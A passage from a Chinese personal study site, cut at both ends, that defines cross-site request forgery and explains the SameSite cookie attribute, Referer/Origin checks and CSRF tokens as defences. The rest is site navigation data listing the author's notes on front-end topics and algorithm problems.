href="https://time.geekbang.org/column/article/154110?utm_term=zeusQYFJN&amp;utm_source=app&amp;utm_medium=geektime&amp;utm_campaign=216-end&amp;utm_content=v8zhuanlankaipianci0316" target="_blank" rel="noreferrer">https://time.geekbang.org/column/article/154110?utm_term=zeusQYFJN&amp;utm_source=app&amp;utm_medium=geektime&amp;utm_campaign=216-end&amp;utm_content=v8zhuanlankaipianci0316</a></p></blockquote><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，利用用户的登录状态向被攻击网站发送跨站请求。<strong>利用受害者在被攻击网站已经获取的注册凭证<code>cookie</code></strong>，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><h3 id="如何防止csrf攻击-samesite等" tabindex="-1">如何防止CSRF攻击？SameSite等 <a class="header-anchor" href="#如何防止csrf攻击-samesite等" aria-label="Permalink to &quot;如何防止CSRF攻击？SameSite等&quot;">​</a></h3><ol><li><p>充分利用好 Cookie 的 <code>SameSite</code> 属性</p><p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">set-cookie: 1P_JAR=2019-10-20-06; expires=Tue, 19-Nov-2019 06:36:21 GMT; path=/; domain=.google.com; SameSite=none</span></span></code></pre></div><p>SameSite 选项通常有 <code>Strict</code>、<code>Lax</code> 和 <code>None</code> 三个值。</p><ul><li>Strict：那么浏览器会完全禁止第三方 Cookie。</li><li>Lax：从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。</li><li>None：在任何情况下都会发送 Cookie 数据。</li></ul></li><li><p>利用HTTP <strong>请求头</strong>中的 <code>Referer</code> 和 <code>Origin</code> 属性了，验证请求的来源站点。</p><ul><li>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址</li><li>Origin 也是标记了HTTP请求的来源，但不包含具体的URL路径 <img src="/assets/pic4.d2ef8b77.png"> 服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值</li></ul></li><li><p><code>CSRF Token</code></p><ol><li>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。</li><li>第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</li></ol></li></ol></div></div></main><footer class="VPDocFooter" data-v-4dd2ec74 data-v-c74aa331><!--[--><!--]--><!----><div class="prev-next" data-v-c74aa331><div class="pager" data-v-c74aa331><a class="pager-link prev" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%89%E5%85%A8-%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8(%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%EF%BC%8C%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB)%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8(https).html" data-v-c74aa331><span class="desc" data-v-c74aa331>Previous page</span><span class="title" data-v-c74aa331>安全-系统安全(安全沙箱，站点隔离)、网络安全(https)</span></a></div><div class="has-prev pager" data-v-c74aa331><a class="pager-link next" href="/%E6%B5%8F%E8%A7%88%E5%99%A8/%E5%AE%8F%E8%A7%82(1)-%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84%E3%80%81%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E5%B1%95%E7%A4%BA.html" data-v-c74aa331><span class="desc" data-v-c74aa331>Next page</span><span class="title" data-v-c74aa331>宏观(1)-多进程架构、从输入URL到展示</span></a></div></div></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><footer class="VPFooter has-sidebar" data-v-bfa41ecf data-v-25eaf08f><div class="container" data-v-25eaf08f><p class="message" data-v-25eaf08f>弯弯个人小站</p><p class="copyright" data-v-25eaf08f>Copyright © 2023-2023 wanwan </p></div></footer><!--[--><!--]--></div></div>
    <script>__VP_HASH_MAP__ = JSON.parse("{\"google v8_v8(3) - 垃圾回收机制，内存泄露.md\":\"69529e60\",\"google v8_v8(1) - 变量提升，作用域、内存管理机制、闭包、如何执行js代码.md\":\"abb47072\",\"google v8_v8(2) - 事件循环机制.md\":\"a07eac54\",\"javascript基础_call、apply、bind、new.md\":\"ab298650\",\"javascript基础_es6新特性.md\":\"67cb86a4\",\"javascript基础_js奇技淫巧.md\":\"7ef6831b\",\"javascript基础_js原型(原型链)、作用域、this、执行上下文、闭包.md\":\"6133c823\",\"javascript基础_js类型判断、类型转换(隐式、强制(显式)).md\":\"c3fd1bd5\",\"javascript基础_创建对象、继承.md\":\"e77c8163\",\"javascript基础_深浅拷贝.md\":\"b1160550\",\"guide.md\":\"61e70613\",\"其他_网络请求axios、fetch.md\":\"fba46edd\",\"javascript基础_防抖、节流.md\":\"987b27a0\",\"javascript基础_异步编程(promise、generator、async_await).md\":\"a7b0ecce\",\"team.md\":\"d337f7fe\",\"其他_前端渲染方案：csr、ssr、ssg.md\":\"85882f47\",\"index.md\":\"358c87cf\",\"其他_登陆校验方案：cookie，jwt.md\":\"492fc705\",\"其他_单页面应用路由-hash、history模式.md\":\"f54dd48d\",\"其他_浏览器跨域、网络安全、攻击防范.md\":\"655216b1\",\"前端框架_react_react核心原理_react核心原理1-理念(react15、fiber架构).md\":\"22a11d67\",\"前端框架_react_react核心原理_react核心原理2-diff.md\":\"1aa7c3f4\",\"前端框架_vue_vue响应式原理.md\":\"ace8f8c5\",\"前端框架_react与vue.md\":\"21c41dad\",\"前端框架_react_react核心原理_react核心原理2-架构(render_commit阶段，生命周期).md\":\"90d7dab8\",\"前端框架_react_react核心原理_react核心原理3-状态更新.md\":\"6b97bd30\",\"前端框架_react_react核心原理_react核心原理5-concurrent-mode.md\":\"5208c129\",\"前端框架_react_react核心原理_react核心原理4-hooks.md\":\"43cb2488\",\"前端框架_react_状态管理-redux_usereducer_usecontext_unstated-next.md\":\"90b67201\",\"工程化_性能优化、监控相关.md\":\"bd17baac\",\"前端框架_前端框架原理.md\":\"3d46557b\",\"工程化_包管理相关npm，yarn，pnpm.md\":\"7bee020d\",\"浏览器_安全-系统安全(安全沙箱，站点隔离)、网络安全(https).md\":\"a51e47bb\",\"浏览器_存储-cookie、localstorage、sessionstorage、登陆保持.md\":\"cdd033bc\",\"浏览器_web api-xmlhttprequest，及ajax_axios_fetch之间的区别.md\":\"256cc6d2\",\"工程化_webpack-学习笔记.md\":\"5531c1e2\",\"浏览器_宏观(2)-渲染流程.md\":\"f714522a\",\"浏览器_宏观(1)-多进程架构、从输入url到展示.md\":\"190af243\",\"浏览器_缓存-dns、cdn.md\":\"b65ebf3d\",\"浏览器_缓存-浏览器(http)缓存(强缓存，协商缓存).md\":\"4293c767\",\"浏览器_安全-页面安全(跨域，网站攻击).md\":\"d24b59e6\",\"浏览器_网络(1)-tcp协议，dns解析(域名解析).md\":\"b94ea0f0\",\"浏览器_网络(4)-http协议相关知识.md\":\"328e7ff8\",\"浏览器_网络(3)-https.md\":\"71fd45f1\",\"算法_112.路径总和.md\":\"6f3b4575\",\"算法_二叉树_100.相同的树.md\":\"6de7e3f5\",\"浏览器_网络(2)-http1、2、3.md\":\"643fafc8\",\"算法_二叉树_104.二叉树的最大深度.md\":\"dee7cb62\",\"算法_二叉树_101.对称二叉树.md\":\"3322502e\",\"算法_二叉树_111.二叉树的最小深度.md\":\"db604c2c\",\"算法_二叉树_108.将有序数组转换为二叉搜索树.md\":\"48ebdd0b\",\"算法_二叉树_145.二叉树的后序遍历.md\":\"466c0a35\",\"算法_二叉树_112.路径总和.md\":\"23f09b12\",\"算法_二叉树_116.填充每个节点的下一个右侧节点指针.md\":\"386898d4\",\"算法_二叉树_94.二叉树的中序遍历.md\":\"ea099f1b\",\"算法_二叉树_226.翻转二叉树.md\":\"d5ddab31\",\"算法_二叉树_110.平衡二叉树.md\":\"fea3c19a\",\"算法_二叉树_701.二叉搜索树中的插入操作.md\":\"e167d749\",\"算法_其他_1630.等差子数组.md\":\"7496debb\",\"算法_其他_204.计数质数.md\":\"b1f550e7\",\"算法_215.数组中的第k个最大元素.md\":\"f7cc33d4\",\"算法_其他_238.除自身以外数组的乘积.md\":\"b311c94f\",\"算法_二叉树_144.二叉树的前序遍历.md\":\"3e57dc2d\",\"算法_二叉树_114.二叉树展开为链表.md\":\"ee0703c1\",\"算法_二叉树_450.删除二叉搜索树中的节点.md\":\"0785fb54\",\"算法_二叉树_98.验证二叉搜索树.md\":\"ea1fe13c\",\"算法_二叉树_index.md\":\"47b12713\",\"算法_其他_43.字符串相乘.md\":\"6dcc9657\",\"算法_二叉树_700.二叉搜索树中的搜索.md\":\"9f5a0302\",\"算法_分治算法_归并排序.md\":\"b32e3ee4\",\"算法_动态规划_120.三角形最小路径和.md\":\"fb464059\",\"算法_动态规划_279.完全平方数.md\":\"fb17fe50\",\"算法_分治算法_241.为运算表达式设计优先级.md\":\"1f1e88b3\",\"算法_动态规划_45.跳跃游戏-ii.md\":\"f9540751\",\"算法_动态规划_509.斐波那契数.md\":\"467f1d35\",\"算法_动态规划_322.零钱兑换.md\":\"a4bee455\",\"算法_动态规划_70.爬楼梯.md\":\"230d1e28\",\"算法_动态规划_index.md\":\"e465c1ac\",\"算法_动态规划_买卖股票系列问题_index.md\":\"4b4c1b47\",\"算法_动态规划_63.不同路径-ii.md\":\"b6524829\",\"算法_动态规划_62.不同路径.md\":\"2a427f25\",\"算法_动态规划_子序列类问题_300.最长递增子序列.md\":\"88dbd005\",\"算法_动态规划_子序列类问题_1143.最长公共子序列.md\":\"2c65d83f\",\"算法_动态规划_子序列类问题_354.俄罗斯套娃信封问题.md\":\"fc54144c\",\"算法_动态规划_子序列类问题_647.回文子串.md\":\"8f2c007b\",\"算法_动态规划_子序列类问题_index.md\":\"43c18d0b\",\"算法_动态规划_打家劫舍问题_198.打家劫舍.md\":\"d370dca8\",\"算法_动态规划_子序列类问题_53.最大子数组和.md\":\"7891a629\",\"算法_动态规划_打家劫舍问题_213.打家劫舍-ii.md\":\"b6c27f55\",\"算法_动态规划_子序列类问题_516.最长回文子序列.md\":\"12b02307\",\"算法_动态规划_贪心算法_435.无重叠区间.md\":\"7953a03b\",\"算法_动态规划_打家劫舍问题_337.打家劫舍-iii.md\":\"9bb599f6\",\"算法_动态规划_贪心算法_1024.视频拼接.md\":\"7f77e873\",\"算法_动态规划_贪心算法_index.md\":\"4dd265de\",\"算法_动态规划_路径类问题_120.三角形最小路径和.md\":\"d60de238\",\"算法_动态规划_贪心算法_452.用最少数量的箭引爆气球.md\":\"ffc318e5\",\"算法_动态规划_贪心算法_55.跳跃游戏.md\":\"d16b975a\",\"算法_动态规划_路径类问题_62.不同路径.md\":\"418f697a\",\"算法_动态规划_贪心算法_45.跳跃游戏-ii.md\":\"2fa141d0\",\"算法_动态规划_路径类问题_63.不同路径-ii.md\":\"5720ac6b\",\"算法_动态规划_路径类问题_70.爬楼梯.md\":\"793b98ac\",\"算法_回溯算法(dfs深度优先遍历)_22.括号生成.md\":\"5427b1a8\",\"算法_回溯算法(dfs深度优先遍历)_39.组合总和.md\":\"3ed39f09\",\"算法_动态规划_路径类问题_64.最小路径和.md\":\"333756ab\",\"算法_动态规划_路径类问题_931.下降路径最小和.md\":\"58360cd9\",\"算法_回溯算法(dfs深度优先遍历)_46.全排列.md\":\"41c58c9d\",\"算法_回溯算法(dfs深度优先遍历)_47.全排列-ii.md\":\"4306ff1c\",\"算法_回溯算法(dfs深度优先遍历)_78.子集.md\":\"80d0a919\",\"算法_回溯算法(dfs深度优先遍历)_77.组合.md\":\"bf088708\",\"算法_回溯算法(dfs深度优先遍历)_90.子集-ii.md\":\"04aec6b4\",\"算法_图论_797.所有可能的路径.md\":\"222cb9cd\",\"算法_图论_index.md\":\"7b9f727c\",\"算法_括号相关的问题_1541.平衡括号字符串的最少插入次数.md\":\"0a53f15d\",\"算法_括号相关的问题_20.有效的括号.md\":\"531dad4a\",\"算法_括号相关的问题_921.使括号有效的最少添加.md\":\"5d7740d7\",\"算法_括号相关的问题_22.括号生成.md\":\"da571c52\",\"算法_排序、查找算法_test.md\":\"41b89f62\",\"算法_括号相关的问题_index.md\":\"0b8e9538\",\"算法_排序、查找算法_查找算法.md\":\"12afcbf0\",\"算法_回溯算法(dfs深度优先遍历)_index.md\":\"d49a88a1\",\"算法_数组_index.md\":\"06b56339\",\"算法_数组_二分搜索_34.在排序数组中查找元素的第一个和最后一个位置.md\":\"acb9ba61\",\"算法_数组_二分搜索_35.搜索插入位置.md\":\"a0290c08\",\"算法_数组_二分搜索_704.二分查找.md\":\"df29a67b\",\"算法_数组_二维数组花式遍历技巧_48.旋转图像.md\":\"b4bd62f3\",\"算法_数组_二维数组花式遍历技巧_index.md\":\"aa0a963e\",\"算法_排序、查找算法_排序算法.md\":\"2efc23d8\",\"算法_数组_前缀和_2389.和有限的最长子序列.md\":\"efe7fea4\",\"算法_数组_前缀和_303.区域和检索-数组不可变.md\":\"ea29497a\",\"算法_数组_二分搜索_index.md\":\"0c5dcabe\",\"算法_数组_双指针_左右指针_1574.删除最短的子数组使剩余数组有序.md\":\"e8c9c339\",\"算法_数组_双指针_876.链表的中间结点.md\":\"38cddb72\",\"算法_数组_双指针_左右指针_index.md\":\"a1d559a5\",\"算法_数组_双指针_左右指针_167.两数之和-ii-输入有序数组.md\":\"1da9a218\",\"算法_数组_去重_316.去除重复字母.md\":\"db54b672\",\"算法_数组_二维数组花式遍历技巧_54.螺旋矩阵.md\":\"6f4cb65e\",\"算法_数组_双指针_11.盛最多水的容器.md\":\"fb3b8711\",\"算法_数组_双指针_左右指针_5.最长回文子串.md\":\"405483f6\",\"算法_数组_双指针_index.md\":\"965e92e8\",\"算法_数组_双指针_快慢指针_index.md\":\"41cd62d1\",\"算法_数组_双指针_左右指针_647.回文子串.md\":\"97773f0d\",\"算法_数组_双指针_快慢指针_26.删除有序数组中的重复项.md\":\"f0c6cb6f\",\"算法_数组_前缀和_304.二维区域和检索-矩阵不可变.md\":\"ae2e6eda\",\"算法_数组_双指针_左右指针_344.反转字符串.md\":\"1efab964\",\"算法_数组_双指针_15.三数之和.md\":\"1a5847f2\",\"算法_数组_双指针_16.最接近的三数之和.md\":\"52198668\",\"算法_数组_双指针_快慢指针_27.移除元素.md\":\"c8d02617\",\"算法_数组_双指针_快慢指针_283.移动零.md\":\"427f4c1b\",\"算法_数组_前缀和_index.md\":\"4f480a6d\",\"算法_数组_前缀和_53.最大子数组和.md\":\"9e6dac25\",\"算法_数组_差分数组_1094.拼车.md\":\"6816885a\",\"算法_数组_差分数组_1109.航班预订统计.md\":\"d466a5b6\",\"算法_数组_差分数组_index.md\":\"28af9f10\",\"算法_数组_滑动窗口_1004.最大连续-1-的个数-iii.md\":\"5ac643f7\",\"算法_数组_滑动窗口_1456.定长子串中元音的最大数目.md\":\"5506367b\",\"算法_数组_滑动窗口_3.无重复字符的最长子串.md\":\"96a73c87\",\"算法_数组_滑动窗口_219.存在重复元素-ii.md\":\"d0a02ae9\",\"算法_数组_滑动窗口_438.找到字符串中所有字母异位词.md\":\"944774e8\",\"算法_数组_滑动窗口_567.字符串的排列.md\":\"26e9f977\",\"算法_数组_滑动窗口_53.最大子数组和.md\":\"291b9b70\",\"算法_数组_滑动窗口_76.最小覆盖子串.md\":\"c2c091f7\",\"算法_数组_滑动窗口_904.水果成篮.md\":\"42a6f12d\",\"算法_数组_滑动窗口_index.md\":\"d9c15192\",\"算法_最大堆_最大堆.md\":\"ae8937a7\",\"算法_设计数据结构_146.lru-缓存.md\":\"5ef7d594\",\"算法_设计数据结构_239.滑动窗口最大值(单调队列).md\":\"18918f15\",\"算法_链表_双指针技巧 - 单链表_141.环形链表.md\":\"6020d7b6\",\"算法_最大堆_maxheap.md\":\"70f1e8f8\",\"算法_设计数据结构_单调栈_index.md\":\"4fc9c1af\",\"算法_设计数据结构_380.o-1-时间插入、删除和获取随机元素.md\":\"d872c49e\",\"算法_链表_双指针技巧 - 单链表_160.相交链表.md\":\"01f92133\",\"算法_链表_双指针技巧 - 单链表_83.删除排序链表中的重复元素.md\":\"43751bf3\",\"算法_链表_双指针技巧 - 单链表_86.分隔链表.md\":\"d92f1cd7\",\"算法_链表_双指针技巧 - 单链表_21.合并两个有序链表.md\":\"984c414d\",\"算法_链表_双指针技巧 - 单链表_index.md\":\"3ab5ec52\",\"算法_链表_递归反转单链表_206.反转链表.md\":\"e57854f3\",\"算法_链表_双指针技巧 - 单链表_876.链表的中间结点.md\":\"51d39773\",\"算法_链表_递归反转单链表_92.反转链表-ii.md\":\"5f5b1862\",\"算法_随机算法_384.打乱数组.md\":\"5e26d215\",\"算法_链表_递归反转单链表_25.k-个一组翻转链表.md\":\"ddf12be0\",\"算法_随机算法_398.随机数索引.md\":\"f59f9281\",\"算法_随机算法_528.按权重随机选择.md\":\"661d471e\"}")
__VP_SITE_DATA__ = JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"弯弯个人小站\",\"description\":\"万雯赟小站\",\"base\":\"/\",\"head\":[],\"appearance\":true,\"themeConfig\":{\"logo\":\"/images/logo.png\",\"nav\":[{\"text\":\"个人简历\",\"link\":\"/guide\"},{\"text\":\"学习小记\",\"items\":[{\"text\":\"JS基础\",\"link\":\"/JavaScript基础/js原型(原型链)、作用域、this、执行上下文、闭包.md\"},{\"text\":\"Google V8\",\"link\":\"/Google V8/V8(1) - 变量提升，作用域、内存管理机制、闭包、如何执行JS代码.md\"},{\"text\":\"浏览器\",\"link\":\"/浏览器/宏观(1)-多进程架构、从输入URL到展示.md\"},{\"text\":\"前端框架\",\"link\":\"/前端框架/React/React核心原理/React核心原理1-理念(React15、fiber架构).md\"},{\"text\":\"LC刷题笔记\",\"link\":\"/算法/动态规划/120.三角形最小路径和.md\"},{\"text\":\"工程化\",\"link\":\"/工程化/Webpack-学习笔记.md\"},{\"text\":\"其他\",\"link\":\"/其他/浏览器跨域、网络安全、攻击防范.md\"}]},{\"text\":\"团队成员\",\"link\":\"/team\"}],\"sidebar\":{\"/JavaScript基础\":[{\"text\":\"call、apply、bind、new\",\"link\":\"/JavaScript基础/call、apply、bind、new.md\"},{\"text\":\"es6新特性\",\"link\":\"/JavaScript基础/es6新特性.md\"},{\"text\":\"js原型(原型链)、作用域、this、执行上下文、闭包\",\"link\":\"/JavaScript基础/js原型(原型链)、作用域、this、执行上下文、闭包.md\"},{\"text\":\"js奇技淫巧\",\"link\":\"/JavaScript基础/js奇技淫巧.md\"},{\"text\":\"js类型判断、类型转换(隐式、强制(显式))\",\"link\":\"/JavaScript基础/js类型判断、类型转换(隐式、强制(显式)).md\"},{\"text\":\"创建对象、继承\",\"link\":\"/JavaScript基础/创建对象、继承.md\"},{\"text\":\"异步编程(promise、generator、async,await)\",\"link\":\"/JavaScript基础/异步编程(promise、generator、async,await).md\"},{\"text\":\"深浅拷贝\",\"link\":\"/JavaScript基础/深浅拷贝.md\"},{\"text\":\"防抖、节流\",\"link\":\"/JavaScript基础/防抖、节流.md\"}],\"/Google V8\":[{\"text\":\"V8(1) - 变量提升，作用域、内存管理机制、闭包、如何执行JS代码\",\"link\":\"/Google V8/V8(1) - 变量提升，作用域、内存管理机制、闭包、如何执行JS代码.md\"},{\"text\":\"V8(2) - 事件循环机制\",\"link\":\"/Google V8/V8(2) - 事件循环机制.md\"},{\"text\":\"V8(3) - 垃圾回收机制，内存泄露\",\"link\":\"/Google V8/V8(3) - 垃圾回收机制，内存泄露.md\"}],\"/浏览器\":[{\"text\":\"web API-XMLHttpRequest，及ajax,axios,fetch之间的区别\",\"link\":\"/浏览器/web API-XMLHttpRequest，及ajax,axios,fetch之间的区别.md\"},{\"text\":\"存储-cookie、localStorage、sessionStorage、登陆保持\",\"link\":\"/浏览器/存储-cookie、localStorage、sessionStorage、登陆保持.md\"},{\"text\":\"安全-系统安全(安全沙箱，站点隔离)、网络安全(https)\",\"link\":\"/浏览器/安全-系统安全(安全沙箱，站点隔离)、网络安全(https).md\"},{\"text\":\"安全-页面安全(跨域，网站攻击)\",\"link\":\"/浏览器/安全-页面安全(跨域，网站攻击).md\"},{\"text\":\"宏观(1)-多进程架构、从输入URL到展示\",\"link\":\"/浏览器/宏观(1)-多进程架构、从输入URL到展示.md\"},{\"text\":\"宏观(2)-渲染流程\",\"link\":\"/浏览器/宏观(2)-渲染流程.md\"},{\"text\":\"缓存-DNS、CDN\",\"link\":\"/浏览器/缓存-DNS、CDN.md\"},{\"text\":\"缓存-浏览器(http)缓存(强缓存，协商缓存)\",\"link\":\"/浏览器/缓存-浏览器(http)缓存(强缓存，协商缓存).md\"},{\"text\":\"网络(1)-TCP协议，DNS解析(域名解析)\",\"link\":\"/浏览器/网络(1)-TCP协议，DNS解析(域名解析).md\"},{\"text\":\"网络(2)-http1、2、3\",\"link\":\"/浏览器/网络(2)-http1、2、3.md\"},{\"text\":\"网络(3)-https\",\"link\":\"/浏览器/网络(3)-https.md\"},{\"text\":\"网络(4)-http协议相关知识\",\"link\":\"/浏览器/网络(4)-http协议相关知识.md\"}],\"/前端框架\":[{\"text\":\"React\",\"collapsible\":true,\"collapsed\":false,\"items\":[{\"text\":\"React核心原理\",\"collapsible\":true,\"collapsed\":false,\"items\":[{\"text\":\"1-理念(React15、fiber架构)\",\"link\":\"/前端框架/React/React核心原理/React核心原理1-理念(React15、fiber架构).md\"},{\"text\":\"2-架构(render,commit阶段，生命周期)\",\"link\":\"/前端框架/React/React核心原理/React核心原理2-架构(render,commit阶段，生命周期).md\"},{\"text\":\"3-diff\",\"link\":\"/前端框架/React/React核心原理/React核心原理2-diff.md\"},{\"text\":\"4-状态更新\",\"link\":\"/前端框架/React/React核心原理/React核心原理3-状态更新.md\"},{\"text\":\"5-Hooks\",\"link\":\"/前端框架/React/React核心原理/React核心原理4-Hooks.md\"},{\"text\":\"6-Concurrent-Mode\",\"link\":\"/前端框架/React/React核心原理/React核心原理5-Concurrent-Mode.md\"}]},{\"text\":\"状态管理\",\"link\":\"/前端框架/React/状态管理-redux,useReducer+useContext,unstated-next.md\"}]},{\"text\":\"Vue\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"vue响应式原理\",\"link\":\"/前端框架/Vue/vue响应式原理.md\"}]},{\"text\":\"react与vue\",\"link\":\"/前端框架/react与vue.md\"}],\"/算法\":[{\"text\":\"二叉树\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"100.相同的树\",\"link\":\"/算法/二叉树/100.相同的树.md\"},{\"text\":\"101.对称二叉树\",\"link\":\"/算法/二叉树/101.对称二叉树.md\"},{\"text\":\"104.二叉树的最大深度\",\"link\":\"/算法/二叉树/104.二叉树的最大深度.md\"},{\"text\":\"108.将有序数组转换为二叉搜索树\",\"link\":\"/算法/二叉树/108.将有序数组转换为二叉搜索树.md\"},{\"text\":\"110.平衡二叉树\",\"link\":\"/算法/二叉树/110.平衡二叉树.md\"},{\"text\":\"111.二叉树的最小深度\",\"link\":\"/算法/二叉树/111.二叉树的最小深度.md\"},{\"text\":\"112.路径总和\",\"link\":\"/算法/二叉树/112.路径总和.md\"},{\"text\":\"114.二叉树展开为链表\",\"link\":\"/算法/二叉树/114.二叉树展开为链表.md\"},{\"text\":\"116.填充每个节点的下一个右侧节点指针\",\"link\":\"/算法/二叉树/116.填充每个节点的下一个右侧节点指针.md\"},{\"text\":\"144.二叉树的前序遍历\",\"link\":\"/算法/二叉树/144.二叉树的前序遍历.md\"},{\"text\":\"145.二叉树的后序遍历\",\"link\":\"/算法/二叉树/145.二叉树的后序遍历.md\"},{\"text\":\"226.翻转二叉树\",\"link\":\"/算法/二叉树/226.翻转二叉树.md\"},{\"text\":\"450.删除二叉搜索树中的节点\",\"link\":\"/算法/二叉树/450.删除二叉搜索树中的节点.md\"},{\"text\":\"700.二叉搜索树中的搜索\",\"link\":\"/算法/二叉树/700.二叉搜索树中的搜索.md\"},{\"text\":\"701.二叉搜索树中的插入操作\",\"link\":\"/算法/二叉树/701.二叉搜索树中的插入操作.md\"},{\"text\":\"94.二叉树的中序遍历\",\"link\":\"/算法/二叉树/94.二叉树的中序遍历.md\"},{\"text\":\"98.验证二叉搜索树\",\"link\":\"/算法/二叉树/98.验证二叉搜索树.md\"},{\"text\":\"index\",\"link\":\"/算法/二叉树/index.md\"}]},{\"text\":\"其他\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"1630.等差子数组\",\"link\":\"/算法/其他/1630.等差子数组.md\"},{\"text\":\"204.计数质数\",\"link\":\"/算法/其他/204.计数质数.md\"},{\"text\":\"238.除自身以外数组的乘积\",\"link\":\"/算法/其他/238.除自身以外数组的乘积.md\"},{\"text\":\"43.字符串相乘\",\"link\":\"/算法/其他/43.字符串相乘.md\"}]},{\"text\":\"分治算法\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"241.为运算表达式设计优先级\",\"link\":\"/算法/分治算法/241.为运算表达式设计优先级.md\"},{\"text\":\"归并排序\",\"link\":\"/算法/分治算法/归并排序.md\"}]},{\"text\":\"动态规划\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"120.三角形最小路径和\",\"link\":\"/算法/动态规划/120.三角形最小路径和.md\"},{\"text\":\"279.完全平方数\",\"link\":\"/算法/动态规划/279.完全平方数.md\"},{\"text\":\"322.零钱兑换\",\"link\":\"/算法/动态规划/322.零钱兑换.md\"},{\"text\":\"45.跳跃游戏-ii\",\"link\":\"/算法/动态规划/45.跳跃游戏-ii.md\"},{\"text\":\"509.斐波那契数\",\"link\":\"/算法/动态规划/509.斐波那契数.md\"},{\"text\":\"62.不同路径\",\"link\":\"/算法/动态规划/62.不同路径.md\"},{\"text\":\"63.不同路径-ii\",\"link\":\"/算法/动态规划/63.不同路径-ii.md\"},{\"text\":\"70.爬楼梯\",\"link\":\"/算法/动态规划/70.爬楼梯.md\"},{\"text\":\"index\",\"link\":\"/算法/动态规划/index.md\"},{\"text\":\"买卖股票系列问题\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"index\",\"link\":\"/算法/动态规划/买卖股票系列问题/index.md\"}]},{\"text\":\"子序列类问题\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"1143.最长公共子序列\",\"link\":\"/算法/动态规划/子序列类问题/1143.最长公共子序列.md\"},{\"text\":\"300.最长递增子序列\",\"link\":\"/算法/动态规划/子序列类问题/300.最长递增子序列.md\"},{\"text\":\"354.俄罗斯套娃信封问题\",\"link\":\"/算法/动态规划/子序列类问题/354.俄罗斯套娃信封问题.md\"},{\"text\":\"516.最长回文子序列\",\"link\":\"/算法/动态规划/子序列类问题/516.最长回文子序列.md\"},{\"text\":\"53.最大子数组和\",\"link\":\"/算法/动态规划/子序列类问题/53.最大子数组和.md\"},{\"text\":\"647.回文子串\",\"link\":\"/算法/动态规划/子序列类问题/647.回文子串.md\"},{\"text\":\"index\",\"link\":\"/算法/动态规划/子序列类问题/index.md\"}]},{\"text\":\"打家劫舍问题\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"198.打家劫舍\",\"link\":\"/算法/动态规划/打家劫舍问题/198.打家劫舍.md\"},{\"text\":\"213.打家劫舍-ii\",\"link\":\"/算法/动态规划/打家劫舍问题/213.打家劫舍-ii.md\"},{\"text\":\"337.打家劫舍-iii\",\"link\":\"/算法/动态规划/打家劫舍问题/337.打家劫舍-iii.md\"}]},{\"text\":\"贪心算法\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"1024.视频拼接\",\"link\":\"/算法/动态规划/贪心算法/1024.视频拼接.md\"},{\"text\":\"435.无重叠区间\",\"link\":\"/算法/动态规划/贪心算法/435.无重叠区间.md\"},{\"text\":\"45.跳跃游戏-ii\",\"link\":\"/算法/动态规划/贪心算法/45.跳跃游戏-ii.md\"},{\"text\":\"452.用最少数量的箭引爆气球\",\"link\":\"/算法/动态规划/贪心算法/452.用最少数量的箭引爆气球.md\"},{\"text\":\"55.跳跃游戏\",\"link\":\"/算法/动态规划/贪心算法/55.跳跃游戏.md\"},{\"text\":\"index\",\"link\":\"/算法/动态规划/贪心算法/index.md\"}]},{\"text\":\"路径类问题\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"120.三角形最小路径和\",\"link\":\"/算法/动态规划/路径类问题/120.三角形最小路径和.md\"},{\"text\":\"62.不同路径\",\"link\":\"/算法/动态规划/路径类问题/62.不同路径.md\"},{\"text\":\"63.不同路径-ii\",\"link\":\"/算法/动态规划/路径类问题/63.不同路径-ii.md\"},{\"text\":\"64.最小路径和\",\"link\":\"/算法/动态规划/路径类问题/64.最小路径和.md\"},{\"text\":\"70.爬楼梯\",\"link\":\"/算法/动态规划/路径类问题/70.爬楼梯.md\"},{\"text\":\"931.下降路径最小和\",\"link\":\"/算法/动态规划/路径类问题/931.下降路径最小和.md\"}]}]},{\"text\":\"回溯算法(DFS深度优先遍历)\",\"collapsible\":true,\"collapsed\":true,\"items\":[{\"text\":\"22.括号生成\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/22.括号生成.md\"},{\"text\":\"39.组合总和\",\"link\":\"/算法/回溯算法(DFS深度优先遍历)/39.组合总和.md\"},{\"text\":\"46.全排列\",\"link\":\